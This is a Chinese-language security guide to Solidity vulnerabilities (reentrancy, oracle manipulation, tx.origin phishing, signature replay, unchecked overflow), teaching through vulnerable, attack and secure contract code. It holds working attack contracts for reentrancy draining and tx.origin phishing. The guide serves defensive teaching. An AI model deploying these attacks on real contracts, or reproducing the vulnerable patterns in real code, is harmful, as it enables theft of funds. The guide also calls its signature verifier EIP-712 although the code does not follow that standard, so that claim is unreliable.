# Solidity 常见漏洞类型深度剖析指南

> 在以太坊与 EVM 生态中，“代码即法律”（Code is Law）既是去中心化共识的魅力所在，也是开发者的噩梦。一旦智能合约部署上链，任何细微的逻辑漏洞都会被全球黑客置于放大镜下，成为黑客攻击和资金盗取的弹药。本指南将深度解构 Solidity 领域最致命的 5 类经典与前沿漏洞，提供“脆弱合约、攻击合约、防御合约”的三位一体全实战代码，帮助开发者彻底杜绝安全风险。

---

## 1. 重入攻击：经典重入与只读重入（Reentrancy & Read-Only Reentrancy）

### 1.1 经典重入漏洞原理
**经典重入（Classic Reentrancy）**发生于“转账后、修改账本前”。当合约向外部地址发送 Native ETH 时（使用 `call{value: ...}("")`），如果接收方是合约账户，会触发接收方的 `fallback` 或 `receive` 函数。
如果原合约未采用 **Checks-Effects-Interactions (检查-效果-交互)** 编码规范，黑客即可在 `fallback` 回调中**再次调用**原合约的提现函数。此时由于原合约尚未扣减黑客的余额状态，黑客便可利用此时间差将合约内的所有资金循环提空。

```
 [1. 正常提现] ────> 脆弱合约：Alice 余额 10 ETH，申请提现。
                         │
                         ▼
 [2. 汇出代币] <──── 脆弱合约：向黑客合约汇出 10 ETH。
      │                  (此时脆弱合约还来不及扣减 Alice 的余额！)
                         ▼
 [3. 恶意重入] ────> 黑客合约 fallback()：收到币后，立刻【再次调用】提现函数！
                         │
                         ▼
 [4. 循环榨干] ────> 脆弱合约：查询到 Alice 的账面依然有 10 ETH，再次汇币... (循环直至归零)
```

### 1.2 经典重入实战代码剖析

#### ❌ 脆弱合约 (VulnerableEtherStore.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableEtherStore {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Zero balance");

        // 交互 (Interaction)：发送以太币
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // 效果 (Effect)：延迟更新余额（漏洞根源！）
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

#### 😈 攻击合约 (ReentrancyAttack.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableStore {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IVulnerableStore public store;
    address public owner;

    constructor(address _storeAddress) {
        store = IVulnerableStore(_storeAddress);
        owner = msg.sender;
    }

    // 接收以太币时的回调函数，核心攻击点
    receive() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw(); // 核心重入：在余额扣减前再次提款
        }
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to start attack");
        
        // 1. 先存入 1 ETH 激活账本余额
        store.deposit{value: 1 ether}();
        // 2. 立即调用提现，启动重入循环
        store.withdraw();
    }

    // 提现赃款
    function withdrawFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

#### 🛡️ 防御合约 (SecureEtherStore.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureEtherStore is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev 两种防护手段并用：1. CEI 规范，2. nonReentrant 锁
     */
    function withdraw() external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Zero balance");

        // 1. 效果 (Effect)：在转账交互前先清零余额（CEI 标准防线）
        balances[msg.sender] = 0;

        // 2. 交互 (Interaction)：转账
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }
}
```

### 1.3 前沿黑科技：跨合约只读重入（Read-Only Reentrancy）
- **漏洞背景**：这是 2023-2024 年 DeFi 爆发最频繁的漏洞（如 Curve 操纵价格）。
- **底层原理**：在 Curve、Balancer 等流动性池中，存在移除流动性触发回调（如转账 Native ETH 给黑客）的环节。在回调期间，池子的**代币余额已经减少，但由于还未执行到状态修改行，池子的虚拟价格（`get_virtual_price`）还没有被更新重新计算**。
- **攻击过程**：黑客不需要重入修改池子资金，而是重入调用另一个**只读**函数查询当前池子价格，并将这个“虚假的高价格”提供给第三方的借贷协议（借贷协议将该 Curve 池代币作为抵押品），使借贷协议错误评估黑客的抵押物价值极高，从而借空借贷协议的所有资产。
- **加固方案**：即使是**只读函数**，只要涉及到价格等关键状态输出，也必须添加 `nonReentrant` 保护，在池子状态锁定（Locked）期间拒绝被查询，或引入去中心化 TWAP 预言机。

---

## 2. 闪电贷与预言机操纵漏洞（Flash Loan & Oracle Manipulation）

### 2.1 漏洞原理
有些合约为了获取某代币的实时价格，直接查询 DEX 池子当前的瞬时余额（例如 `balanceOf(USDT) / balanceOf(WETH)`）。
- **套路**：由于 DEX 的瞬时价格可以通过一笔巨额交易瞬间砸歪，黑客可以通过**闪电贷**无成本融入数亿美元资金，在 DEX 中疯狂买卖该代币，使池子的瞬时比例发生暴跌或暴涨。
- **作恶**：随后，脆弱合约在这一瞬间调用了该 DEX 池子读取价格，获取到了一个被扭曲了千万倍的“假天价”。黑客利用该假价低价清算他人或高估自己的抵押品借干协议。

### 2.2 实战代码剖析

#### ❌ 脆弱合约 (VulnerableOracleStore.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IDexPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerableOracleStore {
    IDexPair public dexPair; // 某 Uniswap V2 交易对

    constructor(address _dexPair) {
        dexPair = IDexPair(_dexPair);
    }

    /**
     * @notice 直接读取 DEX 的即时储备比例计算代币价格 (漏洞根源！)
     * @dev 极其容易在闪电贷砸盘时被一瞬间扭曲价格
     */
    function getAssetPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = dexPair.getReserves();
        // 假设 Token0 是目标资产，Token1 是稳定币 (USDT)
        return (uint256(reserve1) * 1e18) / uint256(reserve0);
    }

    // 基于此瞬时价格评估用户最多可以借出的资产...
}
```

#### 🛡️ 防御合约 (SecurePriceOracle.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IChainlinkOracle {
    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

contract SecurePriceOracle {
    IChainlinkOracle public immutable chainlinkFeed;

    constructor(address _chainlinkFeed) {
        chainlinkFeed = IChainlinkOracle(_chainlinkFeed);
    }

    /**
     * @notice 采用 Chainlink 去中心化预言机，多源喂价，并执行严格的时间戳检查
     */
    function getAssetPrice() external view returns (uint256) {
        (
            ,
            int256 price,
            ,
            uint256 updatedAt,
            
        ) = chainlinkFeed.latestRoundData();
        
        require(price > 0, "Chainlink price is negative");
        // 安全检查：如果价格数据超过 1 小时未更新，则拒绝使用，防止脏数据/停机
        require(block.timestamp - updatedAt < 3600, "Price data is stale");

        return uint256(price);
    }
}
```

---

## 3. 访问控制缺失与 `tx.origin` 钓鱼攻击 (Access Control & tx.origin Phishing)

### 3.1 漏洞原理
在 Solidity 中，有两个获取调用源地址的全局变量：
- **`msg.sender`**：返回**直接调用**当前合约的那个账户/合约地址。
- **`tx.origin`**：返回发起这笔以太坊交易的**最初始外部账户（EOA）**地址。

如果开发者在合约中错误地使用 `tx.origin` 验证管理员权限：
- **钓鱼场景**：黑客可以编写一个钓鱼合约，诱导该智能合约的管理员向该钓鱼合约发送 1 笔小额交易。
- **越权执行**：当管理员调用钓鱼合约时，钓鱼合约的 `fallback` 会在后台**再次调用**脆弱合约的提款函数。此时对脆弱合约而言，`tx.origin` 确实是发起这整笔交易的管理员钱包，权限校验轻松通过，导致国库资产被洗劫一空。

```
 [1. 诱导钓鱼] ────> 管理员(EOA) ──(发送交易)──> 恶意钓鱼合约
                                                        │
                                                        ▼ (后台转发调用)
 [2. 越权提取] ─── tx.origin == 管理员 ────────────────> 脆弱合约.withdraw()
                   【校验通过！脆弱合约误认为这是管理员的清白操作，汇出资金】
```

### 3.2 实战代码剖析

#### ❌ 脆弱合约 (TxOriginWallet.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract TxOriginWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {}

    /**
     * @notice 错误地采用 tx.origin 进行所有权校验
     */
    function transfer(address payable _to, uint256 _amount) external {
        // 漏洞根源！如果 owner 被诱导调用了恶意钓鱼合约，此处将被轻松通过
        require(tx.origin == owner, "Not the owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

#### 😈 攻击合约 (PhishingAttack.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITxWallet {
    function transfer(address payable _to, uint256 _amount) external;
}

contract PhishingAttack {
    address payable public attacker;
    ITxWallet public wallet;

    constructor(address _walletAddress) {
        wallet = ITxWallet(_walletAddress);
        attacker = payable(msg.sender);
    }

    // 诱导 owner 发生交互时的回调
    receive() external payable {
        // 关键钓鱼调用：利用 owner 的身份，在后台提款
        wallet.transfer(attacker, address(wallet).balance);
    }
}
```

#### 🛡️ 防御合约 (SecureWallet.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SecureWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {}

    /**
     * @notice 使用 msg.sender 锁死直接调用身份，彻底终结 tx.origin 钓鱼可能
     */
    function transfer(address payable _to, uint256 _amount) external {
        // 任何中间合约伪造的调用，都会因为 msg.sender 变更为中间合约而报错拦截
        require(msg.sender == owner, "Not the owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

---

## 4. 签名重放攻击（Signature Replay）

### 4.1 漏洞原理
在无 Gas 委托交易中，用户通过本地私钥生成 ECDSA 签名（r, s, v），由中继器（Relayer）代发上链。
- **漏洞根源**：如果签名体中没有包含 **唯一的随机数（Nonce）**、**目标合约地址（contractAddress）**、或 **链 ID（chainId）**，黑客可以直接截获这一串清白签名。
- **作恶路径**：
  1. **同合约重放**：黑客将该签名再次传给合约，由于之前已经验证过该签名是清白的，合约可能再次放行，实现双重甚至无限次提取。
  2. **跨合约/跨链重放**：将以太坊主网上的签名，拿到 Polygon 或者 Arbitrum 的同款合约上再次验证并提现。

### 4.2 生产级防重放签名方案

要防御签名重放，必须采用符合 **EIP-712** 的类型化签名，并在合约内设置 **`nonces` 状态记录器** 与 **链 ID 校验**。

#### 🛡️ 完备防重放校验合约 (SecureSignatureVerifier.sol)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SecureSignatureVerifier {
    using ECDSA for bytes32;

    address public signer; // 信任的签名者地址
    
    // 1. 同合约重放防护：记录已使用的 nonce
    mapping(address => mapping(uint256 => bool)) public usedNonces;

    event Withdrawn(address indexed user, uint256 amount);

    constructor(address _signer) {
        signer = _signer;
    }

    /**
     * @notice 带完备防护的代签提现
     * @param user 实际用户地址
     * @param amount 提款数额
     * @param nonce 用于防重放的唯一随机数
     * @param signature 用户的 ECDSA 签名
     */
    function secureWithdraw(
        address user,
        uint256 amount,
        uint256 nonce,
        bytes calldata signature
    ) external {
        // (a) 防护 1：校验 nonce，一签一用
        require(!usedNonces[user][nonce], "Signature nonce already used");
        usedNonces[user][nonce] = true;

        // (b) 防护 2：将 block.chainid、contract address 和 nonce 打包拼接哈希（EIP-712 精髓）
        bytes32 messageHash = keccak256(
            abi.encodePacked(
                block.chainid,      // 跨链重放防御
                address(this),     // 跨合约重放防御
                user,
                amount,
                nonce
            )
        );

        // 转化为以太坊签名标准格式哈希 "\x19Ethereum Signed Message:\n32"
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);

        // (c) 恢复签名者并校验
        address recoveredSigner = ethSignedMessageHash.recover(signature);
        require(recoveredSigner == signer, "Invalid signature");

        payable(user).transfer(amount);
        emit Withdrawn(user, amount);
    }

    receive() external payable {}
}
```

---

## 5. 算术溢出与未检测状态下的精度下溢（Integer Overflow/Underflow）

### 5.1 漏洞历史与现代演进
- **Solidity 0.8.0 之前**：所有的无符号整型运算都是循环的。例如，`uint8(0) - 1` 会变成最大值 `255`。这在早期引发了大量恶性事件（如 BEC 代币溢出归零案）。为此，必须引入 OpenZeppelin 的 `SafeMath` 库，但这会消耗大量部署和交互 Gas。
- **Solidity 0.8.0 之后**：编译器在底层默认加入了**算术溢出拦截器（Panics on Overflow/Underflow）**，一旦计算结果超出界限，交易会立即报错回滚。这终结了绝大多数溢出攻击。
- **现代新痛点**：由于 0.8.x 加入了溢出检查，许多开发者为了极端压榨 Gas 费，在代码中滥用 **`unchecked`** 语法块。`unchecked` 会关闭溢出拦截，如果里面混入了用户可输入的变量（例如没有做好前置边界 check 允许用户传入超大数值），算术溢出灾难将会重现。

### 5.2 实战避坑提示

#### ❌ 滥用 `unchecked` 的脆弱代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableUncheckedStore {
    mapping(address => uint256) public balances;

    // 假设开发者错误地为了省 Gas，将带有用户输入变量的操作放在 unchecked 内
    function batchTransfer(address[] calldata recipients, uint256 amount) external {
        uint256 totalPayout;
        
        unchecked {
            // 如果 amount 很大，或者 recipients 极多，此处可能在 unchecked 内溢出
            // 导致 totalPayout 溢出折算为极小的正数（如 100 wei）
            totalPayout = recipients.length * amount;
        }

        require(balances[msg.sender] >= totalPayout, "Insufficient balance");
        
        balances[msg.sender] -= totalPayout;
        for (uint256 i = 0; i < recipients.length; i++) {
            balances[recipients[i]] += amount;
        }
    }
}
```

#### 🛡️ 黄金安全开发指南
1. **默认不加 `unchecked`**：把安全交给 Solidity 0.8.x 底层编译器把关。
2. **仅在以下情况使用 `unchecked`**：
   - 确定无法发生溢出的递增循环计数器：`for (uint256 i = 0; i < len; ) { ... unchecked { i++; } }`（这可为每次循环省下 100-300 Gas）。
   - 有着极度严苛前置 `require` 隔离的精确相减。
